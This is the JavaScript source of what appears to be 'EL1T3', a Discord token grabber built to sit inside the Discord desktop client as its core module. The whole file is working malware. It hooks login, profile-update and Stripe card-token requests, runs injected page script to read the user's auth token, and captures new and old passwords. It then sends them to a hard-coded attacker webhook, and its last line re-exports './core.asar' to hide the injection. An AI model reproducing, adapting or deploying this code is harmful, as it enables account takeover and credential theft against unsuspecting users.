async function EL1T3(hook_url) {
    const { BrowserWindow, session } = require('electron');
    const { request } = require('https');
    
    async function REQ3ST(url, header, data, type) {
        const req = request({headers: header, hostname: 'discord.com', method: type, port: 443, path: url });
        req.write(JSON.stringify(data));
        req.end();
    };

    async function S3ND(token, password, old_password) {
        const embed = {
            username: 'EL1T3',
            content: '',
            embeds: [
                {
                    'description': '> Token:\n```' + token + '```\n' + '> Password:\n```' + password + '```\n' + '> Old Password:\n```' + old_password + '```\n',
                    'color': 0x0763fd,
                    'footer': {
                        'text': 'https://github.com/Its-Vichy/EL1T3'
                    }                   
                }
            ]
        };

        REQ3ST(hook_url.split('discord.com')[1], { 'content-type': 'application/json' },  embed , 'POST');
    };
    
    try {
        const url_filter = {
            urls: [
                'https://*.discord.com/api/v*/auth/login',
                'https://*.discord.com/api/v*/users/@me',
                'https://discord.com/api/v*/auth/login',
                'https://discord.com/api/v*/users/@me',
                'https://api.stripe.com/v*/tokens'
            ]
        };

        session.defaultSession.webRequest.onCompleted(url_filter, (details, callback) => {
            const js_payload = `var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`;
            const payload = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString());

            BrowserWindow.getFocusedWindow().webContents.executeJavaScript(js_payload, true).then((async token => {
                if (details.statusCode === 200) {
                    await S3ND(token || 'none', payload.new_password || 'none', payload.password || 'none');
                };
            }));
        });
    }
    catch { };  
};

EL1T3('https://discord.com/api/webhooks/886062268662546553/HRflfzkc8aiW3JlaFTBC_e4O0zTYHqI0CKzE0GiPdvdVQYDG3ye4CdizLlzurNlHKm83');
module.exports = require('./core.asar');
